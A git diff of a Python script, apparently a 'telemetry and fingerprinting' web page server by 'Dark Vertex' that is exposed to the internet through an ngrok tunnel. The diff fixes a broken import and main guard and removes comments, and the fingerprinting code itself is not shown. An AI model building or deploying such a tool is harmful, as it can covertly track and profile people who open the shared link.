@@ -10,11 +10,8 @@ import time
 import urllib.request
 import urllib.error
 
-from openai import __name
-
 PORT = 8080
 
-# Advanced Cyberpunk HTML Template with Telemetry & Fingerprinting
 ADVANCED_HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -231,7 +228,7 @@ def get_ngrok_url():
             time.sleep(1)
     return None
 
-if __name == "_main_":
+if __name__ == "__main__":
     os.system('clear' if os.name == 'posix' else 'cls')
     print("\033[1;31m")
     print(r"""
@@ -243,12 +240,10 @@ if __name == "_main_":
     """)
     print("        [>] ADVANCED TELEMETRY ENGINE - BY DARK VERTEX\033[0m\n")
     
-    # Start server in background thread
     server_thread = threading.Thread(target=run_server, daemon=True)
     server_thread.start()
     print(f"[*] Local multi-threaded core initialized on port {PORT}...")
 
-    # Start native ngrok via subprocess to avoid pyngrok android architecture error
     print("[*] Launching secure tunnel protocol...")
     ngrok_process = subprocess.Popen(
         ["ngrok", "http", str(PORT)],
@@ -256,7 +251,6 @@ if __name == "_main_":
         stderr=subprocess.DEVNULL
     )
 
-    # Fetch public URL automatically from ngrok local API
     public_url = get_ngrok_url()
     
     if public_url:
